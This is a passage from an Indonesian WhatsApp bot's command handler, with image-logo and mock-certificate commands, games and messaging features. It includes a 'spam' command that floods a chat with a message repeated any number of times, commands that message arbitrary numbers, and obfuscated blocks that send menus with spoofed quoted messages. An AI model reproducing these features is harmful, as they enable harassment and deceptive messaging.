					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}lovemessage Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/lovemessagetext?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'glitchtext':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					var gh = body.slice(12)
					var ve = gh.split("&")[0];
					var za = gh.split("&")[1];
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}glitchtext Dns & Bot`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/glitchtext?text1=${ve}&text2=${za}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break									
				case 'wetglass':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}wetglass Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/wetglass?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'stylelogo':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}stylelogo Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/stylelogo?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'watercolor':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}watercolor Dns`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/watercolor?text=${q}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
				case 'wolflogo':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					var gh = body.slice(10)
					var ve = gh.split("&")[0];
					var za = gh.split("&")[1];
					if (args.length < 1) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}wolflogo Dns  & Bot`)
					reply(dla.wait())
					vhbuff = await getBuffer(`https://api.vhtear.com/avatarwolf?text1=${ve}&text2=${za}&apikey=${vhtear}`)
					dila.sendMessage(from, vhbuff, image, { quoted: Lan })
					break
/*]====> BY RAMLAN ID <====[*/
				case 'sertifikatmenu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					const serti = `\`\`\`┌ ${pushname}\`\`\`
\`\`\`├ ${prefix}sertiharam\`\`\`
\`\`\`├ ${prefix}sertibabu\`\`\`
\`\`\`├ ${prefix}sertibucin\`\`\`
\`\`\`├ ${prefix}sertibocilff\`\`\`
\`\`\`├ ${prefix}sertigay\`\`\`
\`\`\`├ ${prefix}sertipacar\`\`\`
\`\`\`├ ${prefix}sertisadboy\`\`\`
\`\`\`├ ${prefix}sertisurga\`\`\`
\`\`\`├ ${prefix}sertipinter\`\`\`
\`\`\`├ ${prefix}sertibadboy\`\`\`
\`\`\`├ ${prefix}sertibadgirl\`\`\`
\`\`\`├ ${prefix}sertigoodgirl\`\`\`
\`\`\`├ ${prefix}sertigoodboy\`\`\`
\`\`\`├ ${prefix}sertieditor\`\`\`
\`\`\`├ ${prefix}sertigudluking\`\`\`
\`\`\`├ ${prefix}sertipakboy\`\`\`
\`\`\`├ ${prefix}sertijamet\`\`\`
\`\`\`├ ${prefix}sertiyutub\`\`\`
\`\`\`├ ${prefix}sertiheker\`\`\`
\`\`\`├ ${prefix}sertiff1\`\`\`
\`\`\`├ ${prefix}sertiff2\`\`\`
\`\`\`├ ${prefix}sertiff3\`\`\`
\`\`\`├ ${prefix}sertiff4\`\`\`
\`\`\`├ ${prefix}sertiff5\`\`\`
\`\`\`├ ${prefix}sertipubg1\`\`\`
\`\`\`├ ${prefix}sertipubg2\`\`\`
\`\`\`├ ${prefix}sertiml\`\`\`
\`\`\`└ ${pushname}\`\`\``
					var _0x3828=['C3rHDhvZqgjYB2fKy2fZDa','mte3odm4meXoANH5ua','mtaZmdC0mKX4q3jHuq','CMvHzezPBgvtEw5J','oty4mZC5wvfPwxPz','mebZlNDOyxrZyxbWlM5LDa','mtm3ndC0s3r2tvbN','u2vYDgLMAwTHDcbnzw51','lI9KBNmVDgH1BwjUywLSlMPWzwC','mZu3rfz0wuv4','mZy0m2vcA1fZrq','ntCXntfsrK9ZEue','mvHAwhbXrW','ndy5otbVC21nEK8','C2vUze1LC3nHz2u','mxj1rKLmrW','mtvOqvjtEgO'];var _0x5355c0=_0x4909;function _0x4909(_0x159524,_0x4f89e2){_0x159524=_0x159524-0x1ed;var _0x3828e7=_0x3828[_0x159524];if(_0x4909['bBEwCp']===undefined){var _0x4909a1=function(_0x4869a4){var _0x2bb940='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x310b2f='';for(var _0x553288=0x0,_0x3a5b0b,_0x2d2475,_0x620dc9=0x0;_0x2d2475=_0x4869a4['charAt'](_0x620dc9++);~_0x2d2475&&(_0x3a5b0b=_0x553288%0x4?_0x3a5b0b*0x40+_0x2d2475:_0x2d2475,_0x553288++%0x4)?_0x310b2f+=String['fromCharCode'](0xff&_0x3a5b0b>>(-0x2*_0x553288&0x6)):0x0){_0x2d2475=_0x2bb940['indexOf'](_0x2d2475);}return _0x310b2f;};_0x4909['JsvLsA']=function(_0x4d7c4c){var _0x241c00=_0x4909a1(_0x4d7c4c);var _0x2309d7=[];for(var _0x4629dc=0x0,_0x31f60e=_0x241c00['length'];_0x4629dc<_0x31f60e;_0x4629dc++){_0x2309d7+='%'+('00'+_0x241c00['charCodeAt'](_0x4629dc)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2309d7);},_0x4909['xIGgvc']={},_0x4909['bBEwCp']=!![];}var _0x4cfe75=_0x3828[0x0],_0x11f60a=_0x159524+_0x4cfe75,_0xdb3fe0=_0x4909['xIGgvc'][_0x11f60a];return _0xdb3fe0===undefined?(_0x3828e7=_0x4909['JsvLsA'](_0x3828e7),_0x4909['xIGgvc'][_0x11f60a]=_0x3828e7):_0x3828e7=_0xdb3fe0,_0x3828e7;}(function(_0x5869e7,_0x25c618){var _0x121e08=_0x4909;while(!![]){try{var _0x26954e=-parseInt(_0x121e08(0x1f6))*parseInt(_0x121e08(0x1fd))+-parseInt(_0x121e08(0x1fc))+-parseInt(_0x121e08(0x1fa))*-parseInt(_0x121e08(0x1f5))+-parseInt(_0x121e08(0x1f0))+parseInt(_0x121e08(0x1f9))*parseInt(_0x121e08(0x1f7))+parseInt(_0x121e08(0x1f3))*parseInt(_0x121e08(0x1f4))+parseInt(_0x121e08(0x1ee));if(_0x26954e===_0x25c618)break;else _0x5869e7['push'](_0x5869e7['shift']());}catch(_0x4131dd){_0x5869e7['push'](_0x5869e7['shift']());}}}(_0x3828,0xc9cdd),dila[_0x5355c0(0x1f8)](from,serti,text,{'thumbnail':dnsnew,'sendEphemeral':!![],'quoted':{'key':{'fromMe':![],'participant':_0x5355c0(0x1ef),...from?{'remoteJid':_0x5355c0(0x1fb)}:{}},'message':{'orderMessage':{'itemCount':0x3e7,'status':0xc8,'thumbnail':fs[_0x5355c0(0x1ed)](_0x5355c0(0x1f2)),'surface':0xc8,'message':_0x5355c0(0x1f1),'orderTitle':_0x5355c0(0x1f1),'sellerJid':_0x5355c0(0x1ef)}}}}));
					break
                    case 'sertiharam':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertiharam botwea`)
                    reply(dla.wait())
                    menghayu = await getBuffer(`http://onlydevcity.xyz/AnakHaramSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, menghayu, image, { quoted: Lan })
                    break
                    case 'sertibabu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertibabu botwea`)
                    reply(dla.wait())
                    sertibab = await getBuffer(`http://onlydevcity.xyz/BabuSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertibab, image, { quoted: Lan })
                    break
                    case 'sertibucin':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertibucin botwea`)
                    reply(dla.wait())
                    sertibuci = await getBuffer(`http://onlydevcity.xyz/BucinSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertibuci, image, { quoted: Lan })
                    break
                    case 'sertibocilff':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertibocilff botwea`)
                    reply(dla.wait())
                    sertibocilf = await getBuffer(`http://onlydevcity.xyz/CilEpepSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertibocilf, image, { quoted: Lan })
                    break
                    case 'sertigay':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertigay botwea`)
                    reply(dla.wait())
                    sertiga = await getBuffer(`http://onlydevcity.xyz/GaySerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertiga, image, { quoted: Lan })
                    break
                    case 'sertipacar':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertipacar botwea`)
                    reply(dla.wait())
                    sertipaca = await getBuffer(`http://onlydevcity.xyz/PacarSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertipaca, image, { quoted: Lan })
                    break
                    case 'sertisadboy':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertisadboy botwea`)
                    reply(dla.wait())
                    sertisadbo = await getBuffer(`http://onlydevcity.xyz/SadBoySerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertisadbo, image, { quoted: Lan })
                    break
                    case 'sertisurga':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertisurga botwea`)
                    reply(dla.wait())
                    sertisurg = await getBuffer(`http://onlydevcity.xyz/SurgaSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertisurg, image, { quoted: Lan })
                    break
                    case 'sertipinter':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertipinter botwea`)
                    reply(dla.wait())
                    sertipinte = await getBuffer(`http://onlydevcity.xyz/PintarSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertipinte, image, { quoted: Lan })
                    break
                    case 'sertibadboy':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertibadboy botwea`)
                    reply(dla.wait())
                    sertibadbo = await getBuffer(`http://onlydevcity.xyz/BadBoySerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertibadbo, image, { quoted: Lan })
                    break
                    case 'sertibadgirl':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertibadgirl botwea`)
                    reply(dla.wait())
                    sertibadgir = await getBuffer(`http://onlydevcity.xyz/BadGirlSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertibadgir, image, { quoted: Lan })
                    break
                    case 'sertigoodgirl':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertigoodgirl botwea`)
                    reply(dla.wait())
                    sertigoodgir = await getBuffer(`http://onlydevcity.xyz/GoodGirlSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertigoodgir, image, { quoted: Lan })
                    break
                    case 'sertigoodboy':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertigoodboy botwea`)
                    reply(dla.wait())
                    sertigoodbo = await getBuffer(`http://onlydevcity.xyz/GoodBoySerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertigoodbo, image, { quoted: Lan })
                    break
                    case 'sertieditor':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertieditor botwea`)
                    reply(dla.wait())
                    sertiedito = await getBuffer(`http://onlydevcity.xyz/EditorBerkelasSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertiedito, image, { quoted: Lan })
                    break
                    case 'sertigudluking':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertigudluking botwea`)
                    reply(dla.wait())
                    sertigudlukin = await getBuffer(`http://onlydevcity.xyz/GoodLookingSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertigudlukin, image, { quoted: Lan })
                    break
                    case 'sertipakboy':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertipakboy botwea`)
                    reply(dla.wait())
                    sertipakbo = await getBuffer(`http://onlydevcity.xyz/FucekBoySerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertipakbo, image, { quoted: Lan })
                    break
                    case 'sertijamet':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertijamet botwea`)
                    reply(dla.wait())
                    sertijame = await getBuffer(`http://onlydevcity.xyz/JametSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertijame, image, { quoted: Lan })
                    break
                    case 'sertiyutub':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertiyutub botwea`)
                    reply(dla.wait())
                    sertiyutu = await getBuffer(`http://onlydevcity.xyz/YoutuberSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertiyutu, image, { quoted: Lan })
                    break
                    case 'sertiheker':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertiheker botwea`)
                    reply(dla.wait())
                    sertiheke = await getBuffer(`http://onlydevcity.xyz/HekerSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertiheke, image, { quoted: Lan })
                    break
                    case 'sertiff1':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertiff1 botwea`)
                    reply(dla.wait())
                    sertiff = await getBuffer(`http://onlydevcity.xyz/FFSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertiff, image, { quoted: Lan })
                    break
                    case 'sertiff2':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertiff2 botwea`)
                    reply(dla.wait())
                    sertif = await getBuffer(`http://onlydevcity.xyz/FFSerti2/img.php?nama=${q}`)
                    dila.sendMessage(from, sertif, image, { quoted: Lan })
                    break
                    case 'sertiff3':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertiff3 botwea`)
                    reply(dla.wait())
                    sertifa = await getBuffer(`http://onlydevcity.xyz/FFSerti3/img.php?nama=${q}`)
                    dila.sendMessage(from, sertifa, image, { quoted: Lan })
                    break
                    case 'sertiff4':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertiff4 botwea`)
                    reply(dla.wait())
                    sertifb = await getBuffer(`http://onlydevcity.xyz/FFSerti4/img.php?nama=${q}`)
                    dila.sendMessage(from, sertifb, image, { quoted: Lan })
                    break
                    case 'sertiff5':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertiff5 botwea`)
                    reply(dla.wait())
                    sertifc = await getBuffer(`http://onlydevcity.xyz/FFSerti5/img.php?nama=${q}`)
                    dila.sendMessage(from, sertifc, image, { quoted: Lan })
                    break
                    case 'sertipubg1':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertipubg1 botwea`)
                    reply(dla.wait())
                    sertipubg = await getBuffer(`http://onlydevcity.xyz/PubgTourSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertipubg, image, { quoted: Lan })
                    break
                    case 'sertipubg2':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertipubg2 botwea`)
                    reply(dla.wait())
                    sertipub = await getBuffer(`http://onlydevcity.xyz/PubgTourSerti2/img.php?nama=${q}`)
                    dila.sendMessage(from, sertipub, image, { quoted: Lan })
                    break
                    case 'sertiml':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
					if (!q) return reply(`Teks Nya Mana Kak?\nContoh :\n${prefix}sertiml botwea`)
                    reply(dla.wait())
                    sertim = await getBuffer(`http://onlydevcity.xyz/MLTourSerti/img.php?nama=${q}`)
                    dila.sendMessage(from, sertim, image, { quoted: Lan })
                    break
				case 'gabutmenu':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					const gabut = `\`\`\`┌ ${pushname}\`\`\`
\`\`\`├ ${prefix}tebakgambar\`\`\`
\`\`\`├ ${prefix}caklontong\`\`\`
\`\`\`├ ${prefix}bisakah\`\`\`
\`\`\`├ ${prefix}kapankah\`\`\`
\`\`\`├ ${prefix}apakah\`\`\`
\`\`\`├ ${prefix}spam\`\`\`
\`\`\`├ ${prefix}tag\`\`\`
\`\`\`├ ${prefix}chat\`\`\`
\`\`\`├ ${prefix}surat\`\`\`
\`\`\`├ ${prefix}slot\`\`\`
\`\`\`├ ${prefix}xox\`\`\`
\`\`\`├ ${prefix}rate\`\`\`
\`\`\`├ ${prefix}hobby\`\`\`
\`\`\`├ ${prefix}truth\`\`\`
\`\`\`├ ${prefix}dare\`\`\`
\`\`\`├ ${prefix}cekbapak\`\`\`
\`\`\`├ ${prefix}seberapagay\`\`\`
\`\`\`└ ${pushname}\`\`\``
var _0x4267=['mtm1mZuZuML6BLrM','C2vUze1LC3nHz2u','mMHlC3vVAq','mteXnda1rK1fBfzY','mebZlNDOyxrZyxbWlM5LDa','mu5fuNzfuG','nZi1ntfszLLPsKy','mw95yMXUBa','mteWnJiXweDbu2Ln','C3rHDhvZqgjYB2fKy2fZDa','mKPNr21lDW','CMvHzezPBgvtEw5J','mJaZzLD4uxfc','r2fIDxqGtwvUDq','mJC1mtj5vuD6BKO','mZa5otGXBLnYsLD6','ntHJuNbbthy'];var _0x1e0232=_0x383c;function _0x383c(_0x468193,_0x527bbf){_0x468193=_0x468193-0x103;var _0x4267c2=_0x4267[_0x468193];if(_0x383c['jsHubD']===undefined){var _0x383ccb=function(_0x19b812){var _0x1ef090='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x516c60='';for(var _0x2de7e3=0x0,_0x18ecb7,_0x141619,_0x36dade=0x0;_0x141619=_0x19b812['charAt'](_0x36dade++);~_0x141619&&(_0x18ecb7=_0x2de7e3%0x4?_0x18ecb7*0x40+_0x141619:_0x141619,_0x2de7e3++%0x4)?_0x516c60+=String['fromCharCode'](0xff&_0x18ecb7>>(-0x2*_0x2de7e3&0x6)):0x0){_0x141619=_0x1ef090['indexOf'](_0x141619);}return _0x516c60;};_0x383c['CZqSgp']=function(_0x3f50a8){var _0x53e68a=_0x383ccb(_0x3f50a8);var _0x2b71e0=[];for(var _0x5ee60c=0x0,_0x5d06e8=_0x53e68a['length'];_0x5ee60c<_0x5d06e8;_0x5ee60c++){_0x2b71e0+='%'+('00'+_0x53e68a['charCodeAt'](_0x5ee60c)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2b71e0);},_0x383c['KfDxpG']={},_0x383c['jsHubD']=!![];}var _0x618d10=_0x4267[0x0],_0x5e9f24=_0x468193+_0x618d10,_0x1b31f4=_0x383c['KfDxpG'][_0x5e9f24];return _0x1b31f4===undefined?(_0x4267c2=_0x383c['CZqSgp'](_0x4267c2),_0x383c['KfDxpG'][_0x5e9f24]=_0x4267c2):_0x4267c2=_0x1b31f4,_0x4267c2;}(function(_0x322aea,_0x36436d){var _0x536e3c=_0x383c;while(!![]){try{var _0x50faa0=parseInt(_0x536e3c(0x10e))+-parseInt(_0x536e3c(0x110))+parseInt(_0x536e3c(0x109))*-parseInt(_0x536e3c(0x105))+-parseInt(_0x536e3c(0x106))*parseInt(_0x536e3c(0x107))+parseInt(_0x536e3c(0x113))*parseInt(_0x536e3c(0x112))+parseInt(_0x536e3c(0x10b))*-parseInt(_0x536e3c(0x10f))+-parseInt(_0x536e3c(0x104))*-parseInt(_0x536e3c(0x10d));if(_0x50faa0===_0x36436d)break;else _0x322aea['push'](_0x322aea['shift']());}catch(_0x30c3d3){_0x322aea['push'](_0x322aea['shift']());}}}(_0x4267,0x2670d),dila[_0x1e0232(0x111)](from,gabut,text,{'thumbnail':dnsnew,'sendEphemeral':!![],'quoted':{'key':{'fromMe':![],'participant':_0x1e0232(0x103),...from?{'remoteJid':_0x1e0232(0x108)}:{}},'message':{'orderMessage':{'itemCount':0x3e7,'status':0xc8,'thumbnail':fs[_0x1e0232(0x10a)]('./dns/thumbnail.jpeg'),'surface':0xc8,'message':_0x1e0232(0x10c),'orderTitle':_0x1e0232(0x10c),'sellerJid':_0x1e0232(0x103)}}}}));
break
					case 'xox':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
            const somtoyy = sotoyy[Math.floor(Math.random() * sotoyy.length)]
            dila.sendMessage(from, `[  🎰 | X O X ]\n-----------------\n\n*${somtoyy}*\n\n-----------------\n[  ?? | XOX ]\n\nKeterangan : Jika anda Mendapatkan Huruf O 3 Huruf Berarti Anda Menang\n\nContoh : O : O : O<=====`, MessageType.text, { quoted: Lan })
            break
            case 'slot':
            case 'slots':
            if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
            const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
            dila.sendMessage(from, `[  🎰 | SLOTS ]\n-----------------\n🍋 : 🍌 : 🍍\n${somtoy}<=====\n🍋 : 🍌 : 🍍\n[  🎰 | SLOTS ]\n\nKeterangan : Jika anda Mendapatkan 3Buah Sama Berarti Anda Menang\n\nContoh : 🍌 : 🍌 : 🍌<=====`, MessageType.text, { quoted: Lan })
            break
					case 'spam':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
				if (!arg) return reply(`Penggunaan ${prefix}spam teks|jumlahspam`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					dila.sendMessage(from, argzi[0], MessageType.text)
				}
				break
					case 'tag':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
					await limitAdd(sender)
			if (args.length < 1) return reply(`Penggunaan ${prefix}tag 62xnxx`)
            var nomqm = `${body.slice(5)}@s.whatsapp.net`
					const tagq = {
					text: `@${nomqm.split('@')[0]} tag!`,
					contextInfo: { forwardingScore: 508, isForwarded: true, mentionedJid: [nomqm]}
					}
					dila.sendMessage(from, tagq, MessageType.text)
			break
			case 'chat':
			if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (args.length < 1) return reply(`Penggunaan ${prefix}chat 62xnxx|hallo`)
            var pc = body.slice(6)
            var nomor = pc.split("|")[0];
            var org = pc.split("|")[1];
            dila.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
            reply(`Sukses mengirim chat:\n${org},@${nomor}`)
            break
            case 'surat':
                if (isBanned) return reply(dla.baned())
			    if (!isRegistered) return reply(dla.noregis())
                if (args.length < 1) return reply(`Penggunaan ${prefix}surat 62xnxx|Isi surat`)
				const textp = body.slice(7)
				const noorg2 = textp.split("|")[0]
				const katakita2 = textp.split("|")[1]
				dila.sendMessage(`${noorg2}@s.whatsapp.net`,`┌─ Surat*
│╭◪
│├ Dari : ${pushname}
│├ Nomor : @${sender.split("@")[0]}
│├ Untuk : Anda
│╰◪
├❏ *Isi Surat*
│╭◪
│├ ${katakita2}
│╰◪
├❏ *Balas Surat*
│╭◪
│├ Untuk Membalas Ketik:
│├ #surat 62xnxx|Hai Juga
│├ Nomor Harus Diawali 62
│╰◪
└─ *${botName}*`, text, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, remoteJid: "6283136505591-1614953337@g.us", id: "B391837A58338BA8186C47E51FFDFD4A" }, message: { documentMessage: { 'jpegThumbnail': fs.readFileSync("./dns/thumbnail.jpeg"), mimetype: "application/octet-stream",title: `${botName}`, fileLength: "36", pageCount: 0, fileName: `Surat dari ${pushname}`}}, messageTimestamp: "1614069378", status: "PENDING"}, contextInfo: {"mentionedJid": [sender] }})
				reply(`Sukses mengirim surat:\n${katakita2}`)
				break
				case 'seberapagay':
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
